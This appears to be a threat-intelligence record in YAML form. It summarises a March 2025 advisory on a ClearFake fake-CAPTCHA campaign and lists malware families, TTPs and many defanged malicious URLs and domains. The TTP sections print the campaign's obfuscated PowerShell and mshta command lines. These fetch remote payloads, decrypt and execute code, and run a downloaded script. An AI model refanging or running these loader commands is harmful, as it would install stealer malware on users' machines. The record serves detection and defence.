@@ -1,0 +1,191 @@
+description: A public security advisory describing a phishing campaign that hosts
+  malicious URLs, lures users with fake Cloudflare Turnstile and reCAPTCHA challenges,
+  and delivers various media files as payloads.
+attribution: APT group or threat actor not explicitly named; activity linked to ClearFake
+  operators.
+malware_families:
+- ClearFake
+- Emmenhtal Loader
+- Lumma Stealer
+- Vidar Stealer
+TTPs:
+  processes: []
+  commandline:
+  - '''POwErsHeLL -w 1 & \\W*\\\\\\\\\\\\\\\\\\\\\\\\\\\\S*2\\\\\\\\\\\m*ht*e hxxps://ai.fdswgw[.]shop/one.mp4
+    # a I am nIt a rIbIt: ClIudflare VerificatiIn ID: 715921'''
+  - '''POwErsHeLL -w 1 & \\W*\\\\\\\\\\\\\\\\\\\\\\\\\\\\S*2\\\\\\\\\\\m*ht*e hxxps://mnjk-jk.bsdfg-zmp-q-n[.]shop/1.mp4
+    # a I am nIt a rIbIt: ClIudflare VerificatiIn ID: 715921'''
+  - '''POwErsHeLL -w 1 & \\W*\\\\\\\\\\\\\\\\\\\\\\\\\\\\S*2\\\\\\\\\\\m*ht*e hxxps://nbhg-v.iuksdfb-f[.]shop/ajax.mp3
+    # a I am nIt a rIbIt: ClIudflare VerificatiIn ID: 715921'''
+  - '''POwErsHeLL -w 1 & \\W*\\\\\\\\\\\\\\\\\\\\\\\\\\\\S*2\\\\\\\\\\\m*ht*e hxxps://nbhg-v.iuksdfb-f[.]shop/ajax.mp3
+    # Restart DNS service in the Microsoft Windows system'''
+  - '''POwErsHeLL -w 1 & \\W*\\\\\\\\\\\\\\\\\\\\\\\\\\\\S*2\\\\\\\\\\\m*ht*e hxxps://hur.bweqlkjr[.]shop/m41.mp4
+    # Restart DNS service in the Microsoft Windows system'''
+  - '''mshta hxxps://microsoft-dns-reload-1r.pages[.]dev # Microsoft Windows: DNS
+    service Reload and Restart UP-'''
+  - '''powershell.exe'' ''-w'' ''1'' ''-ep'' ''Unrestricted'' ''-nop'' ''function
+    PMWks($TzmkWwVw){-split($TzmkWwVw -replace ''..'', ''0x$& '')};$HInQRiv=PMWks(''/*aes-encrypted-payload*/'');$WTbSz=-join
+    [char[]](([Security.Cryptography.Aes]::Create()).CreateDecryptor((PMWks(''6D6C646E664C595246466A4A64464A51'')),[byte[]]::new(16)).TransformFinalBlock($HInQRiv,0,$HInQRiv.Length));
+    & $WTbSz.Substring(0,3) $WTbSz.Substring(3)'
+  - '''iex'' ''Start-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"''
+    ''-WindowStyle'' ''Hidden'' ''-ArgumentList'' ''-w'',''h'',''-ep'',''Unrestricted'',''-Command'',''Set-Item
+    Variable:il ([Net.WebClient]::New());SV WQz (((([Net.WebClient]::New()|GM)|Where{(LS
+    Variable:_).Value.Name -ilike ''''*wn*d*g''''}).Name));Set-Variable HMo ''''hxxps://ty.klipxytozyi[.]shop/kangarooing.bmp'''';Invoke-Command((Item
+    Variable:/E*tex*).Value.InvokeCommand.(((Item Variable:/E*tex*).Value.InvokeCommand.PsObject.Methods|Where{(LS
+    Variable:_).Value.Name -ilike ''''*r*ock''''}).Name)((Variable il).Value.((GV
+    WQz -Value))((GI Variable:/HMo).Value)))'''
+  - '''powershell.exe'' ''-NoProfile'' ''-ExecutionPolicy'' ''Bypass'' ''-Command''
+    "& {$U=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZpbmNlbnQtNDgvaHRtbC9yZWZzL2hlYWRzL21hc3Rlci9wYWdlLnR4dA==''));$C=(Invoke-WebRequest
+    -Uri $U -UseBasicParsing).Content;$B=[scriptblock]::Create($C);&$B}"'
+  powershell:
+  - powershell.exe -w 1 -ep Unrestricted -nop function PMWks($TzmkWwVw){-split($TzmkWwVw
+    -replace '..', '0x$& ')};$HInQRiv=PMWks('/*aes-encrypted-payload*/');$WTbSz=-join
+    [char[]](([Security.Cryptography.Aes]::Create()).CreateDecryptor((PMWks('6D6C646E664C595246466A4A64464A51')),[byte[]]::new(16)).TransformFinalBlock($HInQRiv,0,$HInQRiv.Length));
+    & $WTbSz.Substring(0,3) $WTbSz.Substring(3)
+  - iex Start-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+    -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command','Set-Item
+    Variable:il ([Net.WebClient]::New());SV WQz (((([Net.WebClient]::New()|GM)|Where{(LS
+    Variable:_).Value.Name -ilike ''*wn*d*g''}).Name));Set-Variable HMo 'hxxps://ty.klipxytozyi[.]shop/kangarooing.bmp';Invoke-Command((Item
+    Variable:/E*tex*).Value.InvokeCommand.(((Item Variable:/E*tex*).Value.InvokeCommand.PsObject.Methods|Where{(LS
+    Variable:_).Value.Name -ilike ''*r*ock''}).Name)((Variable il).Value.((GV WQz
+    -Value))((GI Variable:/HMo).Value)))';$MtozVIFS = $env:AppData;function GgSWgWFLW($RuBLC,
+    $JXPOi){curl $RuBLC -o $JXPOi};function fypzzhB(){function hLPZA($TslB){if(!(Test-Path
+    -Path $JXPOi)){GgSWgWFLW $TslB $JXPOi}}}fypzzhB;
+  - powershell -NoProfile -ExecutionPolicy Bypass -Command ""& {$U=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZpbmNlbnQtNDgvaHRtbC9yZWZzL2hlYWRzL21hc3Rlci9wYWdlLnR4dA=='));$C=(Invoke-WebRequest
+    -Uri $U -UseBasicParsing).Content;$B=[scriptblock]::Create($C);&$B}""
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: POwErsHeLL
+    destination: ai.fdswgw[.]shop
+    port: 443
+  - process: POwErsHeLL
+    destination: mnjk-jk.bsdfg-zmp-q-n[.]shop
+    port: 443
+  - process: POwErsHeLL
+    destination: nbhg-v.iuksdfb-f[.]shop
+    port: 443
+  - process: POwErsHeLL
+    destination: hur.bweqlkjr[.]shop
+    port: 443
+  - process: mshta
+    destination: microsoft-dns-reload-1r.pages[.]dev
+    port: 443
+  - process: powershell
+    destination: ty.klipxytozyi[.]shop
+    port: 443
+  - process: powershell
+    destination: raw.githubusercontent[.]com
+    port: 443
+  - process: powershell.exe
+    destination: hxxps://ty.klipxytozyi[.]shop/kangarooing.bmp
+    port: null
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+  urls:
+  - hxxps://ai.fdswgw[.]shop/one.mp4
+  - hxxps://mnjk-jk.bsdfg-zmp-q-n[.]shop/1.mp4
+  - hxxps://nbhg-v.iuksdfb-f[.]shop/ajax.mp3
+  - hxxps://hur.bweqlkjr[.]shop/m41.mp4
+  - hxxps://microsoft-dns-reload-1r.pages[.]dev
+  - hxxps://ty.klipxytozyi[.]shop/kangarooing.bmp
+  - hxxps://raw.githubusercontent[.]com/Vincent-48/html/refs/heads/master/page.txt
+  - hxxps://raw.githubusercontent[.]com/Vincent-48/html/refs/heads/master/TestLAB.exe
+  - hxxps://ert67-o9.pages.dev/data
+  - hxxps://f003.backblazeb2.com/file/skippp/uu.html
+  - hxxps://f003.backblazeb2.com/file/skippp/index.html
+  - hxxps://ert67-o9.pages[.]dev/data
+  - hxxps://f003.backblazeb2[.]com/file/skippp/uu.html
+  - hxxps://f003.backblazeb2[.]com/file/skippp/index.html
+  - hxxps://hostme.pages[.]dev/host
+  - hxxps://ghost-name.pages[.]dev/website
+  - hxxps://gdfg-23rwe.pages[.]dev/index.html
+  - hxxps://sha-11x.pages[.]dev/
+  - hxxps://b1-c1-k8.pages[.]dev/
+  - hxxps://1a-a1.pages[.]dev/
+  - hxxps://sdfwefwg.pages[.]dev/
+  - hxxps://niopg.pages[.]dev/
+  - hxxps://cleaning-devices-k.pages[.]dev/
+  - hxxps://tour-agency-media.pages[.]dev/
+  - hxxps://fresh-orange-juice.pages[.]dev/
+  - hxxps://you-insk-bad.pages[.]dev/
+  - hxxps://human-verify-7u.pages[.]dev/
+  - hxxps://recaptcha-verify-me-1c.pages[.]dev/
+  - hxxps://macos-browser-update-9n.pages[.]dev/
+  - hxxps://macos-browser-update-5i.pages[.]dev/
+  - hxxps://recaptcha-verify-2e.pages[.]dev/
+  - hxxps://recaptcha-verify-7z.pages[.]dev/
+  - hxxps://recaptcha-verify-1t.pages[.]dev/
+  - hxxps://recaptcha-verify-9m.pages[.]dev/
+  - hxxps://disable-data-collect-ai.pages[.]dev/
+  - hxxps://recaptcha-verify-1r.pages[.]dev/
+  - hxxps://recaptha-verify-5q.pages[.]dev/
+  - hxxps://note1.nz7bn[.]pro/nnp.mp4
+  - hxxps://hur.bweqlkjr[.]shop/1a.m4a
+  - hxxps://yob.yrwebsdf[.]shop/1a.m4a
+  - hxxps://yob.yrwebsdf[.]shop/3t.mp4
+  - hxxps://start.cleaning-room-device[.]shop/sha589.m4a
+  - hxxps://discover-travel-agency.pro/joke.m4a
+  - hxxps://discover-travel-agency.pro/walking.mp3
+  - hxxps://discover-travel-agency.pro/1.m4a
+  - hxxps://travel.image-gene-saver.it.com/1.m4a
+  - hxxps://ads.green-pickle-jo[.]shop/1.m4a
+  - hxxps://recaptcha-verify-4h[.]pro/kangarooing.m4a
+  - hxxps://recaptcha-manual[.]shop/kangarooing.m4a
+  - hxxps://recaptcha-verify-4h[.]pro/xfiles/kangarooing.vsdx
+  - hxxps://recaptcha-verify-4h[.]pro/xfiles/verify.mp4
+  - hxxps://human-verify[.]shop/xfiles/verify.mp4
+  - hxxps://human-verify-4r[.]pro/xfiles/verify.mp4
+  - hxxps://human-verify-4r[.]pro/xfiles/human.cpp
+  - hxxps://dns-verify-me[.]pro/xfiles/train.mp4
+  - hxxp://83.217.208[.]130/xfiles/Ohio.mp4
+  - hxxp://83.217.208[.]130/xfiles/VIDA.mp3
+  - hxxp://83.217.208[.]130/xfiles/trip.mp4
+  - hxxp://83.217.208[.]130/xfiles/trip.psd
+  - hxxp://80.64.30[.]238/trip.psd
+  - hxxp://80.64.30[.]238/evix.xll
+  - hxxps://raw.githubusercontent[.]com/fuad686337/tyu/refs/heads/main/BEGIMOT.xll
+  - hxxps://domain[.]com/BEGIMOT.xll
+  - hxxps://disable-data-ai-agent.pages.dev
+  - hxxps://tumbl.design-x[.]xyz/glass.mp3
+  - hxxps://f003.backblazeb2[.]com/file/skippp/glass.mp3
+  - hxxps://sandbox.yunqof[.]shop/macan.mp3
+  - hxxps://microsoft-dns-reload-5q.pages[.]dev
+  domains:
+  - ai.fdswgw[.]shop
+  - mnjk-jk.bsdfg-zmp-q-n[.]shop
+  - nbhg-v.iuksdfb-f[.]shop
+  - hur.bweqlkjr[.]shop
+  - microsoft-dns-reload-1r.pages[.]dev
+  - ty.klipxytozyi[.]shop
+  - raw.githubusercontent[.]com
+  - hxxps://ert67-o9.pages.dev
+  - hxxps://f003.backblazeb2.com
+  - hxxps://hostme.pages.dev
+  - hxxps://ghost-name.pages.dev
+  - hxxps://gdfg-23rwe.pages.dev
+  - hxxps://sha-11x.pages.dev
+  - hxxps://b1-c1-k8.pages.dev
+  - hxxps://1a-a1.pages.dev
+  - hxxps://sdfwefwg.pages.dev
+  - hxxps://niopg.pages.dev
+  - hxxps://cleaning-devices-k.pages.dev
+  - hxxps://tour-agency-media.pages.dev
+  - hxxps://fresh-orange-juice.pages.dev
+  - hxxps://you-insk-bad.pages.dev
+  - hxxps://human-verify-7u.pages.dev
+  - hxxps://recaptcha-verify-me-1c.pages.dev
+  - hxxps://macos-browser-update-9n.pages.dev
+  - hxxps://macos-browser-update-5i.pages.dev
+  - hxxps://recaptcha-verify-2e.pages.dev
+  - hxxps://recaptcha-verify-7z.pages.dev
+  - hxxps://recaptcha-verify-1t.pages.dev
+  - hxxps://recaptcha-verify-9m.pages.dev
+  ips: []
+  hashes: []
+reference: https://blog.sekoia.io/clearfakes-new-widespread-variant-increased-web3-exploitation-for-malware-delivery
+date_of_publication: March 18, 2025
+file_creation_date: October 01, 2025
